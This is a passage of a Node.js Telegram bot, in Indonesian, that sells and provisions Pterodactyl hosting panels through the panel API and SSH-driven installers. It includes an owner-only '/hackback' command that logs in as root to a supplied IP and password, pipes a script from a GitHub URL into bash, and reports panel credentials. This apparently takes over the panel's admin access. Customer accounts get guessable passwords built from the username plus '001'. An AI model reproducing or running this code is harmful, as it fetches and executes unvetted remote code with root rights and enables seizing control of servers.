    bot.sendMessage(chatId, '­ЮЌа­ЮЌў­ЮЌа­ЮЌе­ЮЌЪ­ЮЌћ­ЮЌю ­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌА­ЮЌб­ЮЌЌ­ЮЌў & ­ЮЌЪ­ЮЌб­ЮЌќ­ЮЌћ­ЮЌД­ЮЌю­ЮЌб­ЮЌА');
    
    conn.exec(command, (err, stream) => {
      if (err) {
        bot.sendMessage(chatId, '­ЮЌД­ЮЌ▓­ЮЌ┐­ЮЌи­ЮЌ«­ЮЌ▒­ЮЌХ ­ЮЌИ­ЮЌ▓­Юўђ­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх­ЮЌ«­ЮЌ╗ ­Юўђ­ЮЌ«­ЮЌ«­ЮўЂ ­ЮЌ║­ЮЌ▓­ЮЌ║­ЮЌ»­Юўѓ­ЮЌ«­ЮўЂ ­ЮЌ╗­ЮЌ╝­ЮЌ▒­ЮЌ▓.');
        conn.end();
        return;
      }

      stream.on('close', (code, signal) => {
        console.log(`Node creation stream closed with code ${code} and ${signal} signal`);
        conn.end();
        sendPanelData(subdomain);
      }).on('data', (data) => {
        handleNodeCreationInput(data, stream, domainnode, ramvps);
      }).stderr.on('data', (data) => {
        console.log('STDERR: ' + data);
      });
    });
  }

  function sendPanelData(subdomain) {
    bot.sendMessage(chatId, `­ЮЌЌ­ЮЌћ­ЮЌД­ЮЌћ ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌћ­ЮЌА­ЮЌЌ­ЮЌћ\n\n­ЮЌе­ЮЌд­ЮЌў­ЮЌЦ­ЮЌА­ЮЌћ­ЮЌа­ЮЌў: ­ЮЌб­ЮўЂ­ЮЌ«­ЮўЁ\n­ЮЌБ­ЮЌћ­ЮЌд­ЮЌд­ЮЌф­ЮЌб­ЮЌЦ­ЮЌЌ: ­ЮЌб­ЮўЂ­ЮЌ«­ЮўЁ\n­ЮЌЪ­ЮЌб­ЮЌџ­ЮЌю­ЮЌА: ${subdomain}\n\n­ЮЌА­ЮЌ╝­ЮўЂ­ЮЌ▓: ­ЮЌд­ЮЌ▓­ЮЌ║­Юўѓ­ЮЌ« ­ЮЌю­ЮЌ╗­Юўђ­ЮўЂ­ЮЌ«­ЮЌ╣­ЮЌ«­Юўђ­ЮЌХ ­ЮЌД­ЮЌ▓­ЮЌ╣­ЮЌ«­ЮЌх ­ЮЌд­ЮЌ▓­ЮЌ╣­ЮЌ▓­Юўђ­ЮЌ«­ЮЌХ. ­ЮЌд­ЮЌХ­ЮЌ╣­ЮЌ«­ЮЌх­ЮЌИ­ЮЌ«­ЮЌ╗ ­ЮЌ░­ЮЌ┐­ЮЌ▓­ЮЌ«­ЮўЂ­ЮЌ▓ ­ЮЌ«­ЮЌ╣­ЮЌ╣­ЮЌ╝­ЮЌ░­ЮЌ«­ЮўЂ­ЮЌХ­ЮЌ╝­ЮЌ╗ ­ЮЌ▒­ЮЌХ ­ЮЌ╗­ЮЌ╝­ЮЌ▒­ЮЌ▓ ­Юўє­ЮЌ«­ЮЌ╗­ЮЌ┤ ­ЮЌ▒­ЮЌХ­ЮЌ»­Юўѓ­ЮЌ«­ЮўЂ ­ЮЌ╝­ЮЌ╣­ЮЌ▓­ЮЌх ­ЮЌ»­ЮЌ╝­ЮўЂ ­ЮЌ▒­ЮЌ«­ЮЌ╗ ­ЮЌ«­ЮЌ║­ЮЌ»­ЮЌХ­ЮЌ╣ ­ЮўЂ­ЮЌ╝­ЮЌИ­ЮЌ▓­ЮЌ╗ ­ЮЌИ­ЮЌ╝­ЮЌ╗­ЮЌ│­ЮЌХ­ЮЌ┤­Юўѓ­ЮЌ┐­ЮЌ«­Юўђ­ЮЌХ, ­ЮЌ╣­ЮЌ«­ЮЌ╣­Юўѓ ­ЮЌИ­ЮЌ▓­ЮўЂ­ЮЌХ­ЮЌИ /­Юўё­ЮЌХ­ЮЌ╗­ЮЌ┤­Юўђ ­ЮЌХ­ЮЌй­ЮўЃ­ЮЌй­Юўђ,­ЮЌй­Юўё­ЮўЃ­ЮЌй­Юўђ,(­ЮўЂ­ЮЌ╝­ЮЌИ­ЮЌ▓­ЮЌ╗). \n­ЮЌА­ЮЌ╝­ЮўЂ­ЮЌ▓: ­ЮЌЏ­ЮЌ«­ЮЌ┐­ЮЌ«­ЮЌй ­ЮўЂ­Юўѓ­ЮЌ╗­ЮЌ┤­ЮЌ┤­Юўѓ ­ЮЪГ-­ЮЪ▒ ­ЮЌ║­ЮЌ▓­ЮЌ╗­ЮЌХ­ЮўЂ ­ЮЌ«­ЮЌ┤­ЮЌ«­ЮЌ┐ ­Юўё­ЮЌ▓­ЮЌ» ­ЮЌ»­ЮЌХ­Юўђ­ЮЌ« ­ЮЌ▒­ЮЌХ­ЮЌ«­ЮЌИ­Юўђ­ЮЌ▓­Юўђ.`);
  }

  function handlePanelInstallationInput(data, stream, subdomain, password) {
    if (data.toString().includes('Input')) {
      stream.write('0\n');
    }
    if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otaxoffc@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otaxoffc@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otax\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otax\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otax\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`otax\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
    console.log('STDOUT: ' + data);
  }

  function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
    if (data.toString().includes('Input')) {
      stream.write('1\n');
    }
    if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('otaxoffc@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
    console.log('STDOUT: ' + data);
  }

  function handleNodeCreationInput(data, stream, domainnode, ramvps) {
    stream.write('4\n');
    stream.write('Otax\n');
    stream.write('Otax\n');
    stream.write(`${domainnode}\n`);
    stream.write('Otax\n');
    stream.write(`${ramvps}\n`);
    stream.write(`${ramvps}\n`);
    stream.write('1\n');
    console.log('STDOUT: ' + data);
  }
});

//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//HACKBACK PANEL
bot.onText(/^(\.|\#|\/)hackback$/, async (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `­ЮЌЎ­ЮЌ╝­ЮЌ┐­ЮЌ║­ЮЌ«­ЮўЂ ­Юўђ­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх!\n­ЮЌБ­ЮЌ▓­ЮЌ╗­ЮЌ┤­ЮЌ┤­Юўѓ­ЮЌ╗­ЮЌ«­ЮЌ«­ЮЌ╗: /hackback ­ЮЌХ­ЮЌй­ЮўЃ­ЮЌй­Юўђ,­ЮЌй­ЮЌ«­Юўђ­Юўђ­Юўё­ЮЌ╝­ЮЌ┐­ЮЌ▒`);
  });
bot.onText(/\/hackback (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const t = text.split(',');
  if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "­Юў┐­ЮЎќ­ЮЎБ ­ЮЎћ­ЮЎќ­ЮЎЦ!? ­ЮЎђ­ЮЎБ­ЮЎЕ­ЮЎџ ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќ? ­ЮЎћ­ЮЎќ­ЮЎБ­ЮЎю ­Юўй­ЮЎъ­ЮЎе­ЮЎќ ­ЮЎѕ­ЮЎќ­ЮЎа­ЮЎџ ­ЮўЙ­ЮЎф­ЮЎб­ЮЎќ­ЮЎБ ­ЮЎі­ЮЎг­ЮЎБ­ЮЎџ­ЮЎД ­ЮЎѓ­ЮЎг!!Рюў­ЊѓИ",
            { parse_mode: "Markdown" }
        );
  }
  if (t.length < 2) {
    return bot.sendMessage(chatId, '­ЮЌЎ­ЮЌ╝­ЮЌ┐­ЮЌ║­ЮЌ«­ЮўЂ ­Юўђ­ЮЌ«­ЮЌ╣­ЮЌ«­ЮЌх!\n­ЮЌБ­ЮЌ▓­ЮЌ╗­ЮЌ┤­ЮЌ┤­Юўѓ­ЮЌ╗­ЮЌ«­ЮЌ«­ЮЌ╗: /hackback ­ЮЌХ­ЮЌй­ЮўЃ­ЮЌй­Юўђ,­ЮЌй­ЮЌ«­Юўђ­Юўђ­Юўё­ЮЌ╝­ЮЌ┐­ЮЌ▒,­ЮўЂ­ЮЌ╝­ЮЌИ­ЮЌ▓­ЮЌ╗');
  }
  const ipvps = t[0];
  const passwd = t[1];

  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };
    const conn = new Client();
    const command = 'bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/Installerlex/refs/heads/main/install.sh)'
 
    conn.on('ready', () => {
        isSuccess = true; 
        bot.sendMessage(chatId,'PROSES HACK BACK PTERODACTYL')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ${code} and ${signal} signal');
         bot.sendMessage(chatId, '­ЮЌЌ­ЮЌћ­ЮЌД­ЮЌћ ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌћ­ЮЌА­ЮЌЌ­ЮЌћ\n\n­ЮЌе­ЮЌд­ЮЌў­ЮЌЦ­ЮЌА­ЮЌћ­ЮЌа­ЮЌў: lexcz\n­ЮЌБ­ЮЌћ­ЮЌд­ЮЌд­ЮЌф­ЮЌб­ЮЌЦ­ЮЌЌ: lexcz\n\n\n');
                conn.end();
            }).on('data', (data) => {
                stream.write('7\n');
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// qris
bot.onText(/\/qris/, (msg) => {
    const chatId = msg.chat.id;
    const qris = settings.qris;

    bot.sendPhoto(chatId, qris, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
  parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
});

bot.onText(/\/dana/, (msg) => {
    const chatId = msg.chat.id;
    const dana = settings.dana

    bot.sendMessage(chatId, dana, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/ovo/, (msg) => {
    const chatId = msg.chat.id;
    const ovo = settings.ovo

    bot.sendMessage(chatId, ovo, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/gopay/, (msg) => {
    const chatId = msg.chat.id;
    const gopay = settings.gopay

    bot.sendMessage(chatId, gopay, {
    caption: `\`\`\`INGAT!!!\`\`\`
( ! ) jangan Lupa Untuk Menyertakan Bukti Pembayaran
`,
    parse_mode: "Markdown",
  });
});

bot.onText(/\/panel/, (msg) => {
    const chatId = msg.chat.id;
    const sender = msg.from.username;
    const owner = config.OWNER_ID;
    const text12 = `*Hi @${sender} ­ЪЉІ*
    
­ЮЌќ­ЮЌћ­ЮЌЦ­ЮЌћ ­ЮЌЋ­ЮЌю­ЮЌъ­ЮЌю­ЮЌА­ЮЌА­ЮЌг­ЮЌћ ­ЮЌџ­ЮЌю­ЮЌА­ЮЌю !
­ЮўЅ­Юўа.­Юўќ­ЮўЏ­Юўѕ­ЮўЪ

­ЮЌќ­ЮЌћ­ЮЌЦ­ЮЌћ ­ЮЌћ­ЮЌЌ­ЮЌЌ ­ЮЌе­ЮЌд­ЮЌў­ЮЌЦ ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ :
­ЮЌ┐­ЮЌ«­ЮЌ║ ­Юўѓ­Юўђ­ЮЌ▓­ЮЌ┐­Юўђ,­ЮЌю­ЮЌ▒

­ЮЌ░­ЮЌ╝­ЮЌ╗­ЮўЂ­ЮЌ╝­ЮЌх : /­ЮЪГ­ЮЌ┤­ЮЌ» ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ,­ЮЪГ­ЮЪ»­ЮЪ░­ЮЪ░­ЮЪ▒­ЮЪ▒­ЮўЁ­ЮўЁ­ЮўЁ

­ЮЌЋ­Юўѓ­Юўє ­ЮЌд­ЮЌ░ ­ЮЌб­ЮўЂ­ЮЌ«­ЮўЁ? ­ЮЌЋ­Юўѓ­Юўє ­ЮЌћ­ЮЌ▒­ЮЌ║­ЮЌХ­ЮЌ╗ ­ЮЌБ­ЮЌ«­ЮЌ╗­ЮЌ▓­ЮЌ╣&­ЮЌБ­ЮўЂ ­ЮЌБ­ЮЌ«­ЮЌ╗­ЮЌ▓­ЮЌ╣? ­ЮЌБ­ЮўЃ (@Otapengenkawin)`;
    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '­ЪќЦ№ИЈ Buy Panel', url: 'https://t.me/Otapengenkawin/beli_panel_bangl' }, { text: '­ЪЉц Buy Sc Otax', url: 'https://t.me/Otapengenkawin/buy_Sc_Otax' }]
            ]
        }
    };
    bot.sendPhoto(chatId, randomImage, { caption: text12, parse_mode: 'Markdown', reply_markup: keyboard });
});   

//case create panel
bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /1gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "1gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "1024";
  const cpu = "30";
  const disk = "1024";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
// 2gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /2gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "2gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "2048";
  const cpu = "60";
  const disk = "2048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
РћЈРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
РћѓРђб Jangan Ddos Server
РћѓРђб Wajib tutup domain saat screenshot
РћѓРђб Jngan bagikan domain ke siapapun
РћЌРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРгБ
­ЮЌќ­ЮЌЦ­ЮЌў­ЮЌћ­ЮЌД­ЮЌў ­ЮЌБ­ЮЌћ­ЮЌА­ЮЌў­ЮЌЪ ­ЮЌЋ­ЮЌг ­ЮЌб­ЮЌД­ЮЌћ­ЮЌФ`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!­ЪћЦ"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan­Ъў«РђЇ­Ъње.");
  }
});
//Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░//
// 3gb
// 3gb
bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return;
    
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /3gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "3gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "3072";
  const cpu = "90";
  const disk = "3072";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di data panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya­ЪўЂ
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

PANEL DATA ANDA :
├Ќ═ю├Ќ Login : ${domain}
├Ќ═ю├Ќ Username : ${user.username}
├Ќ═ю├Ќ Password : ${password} 
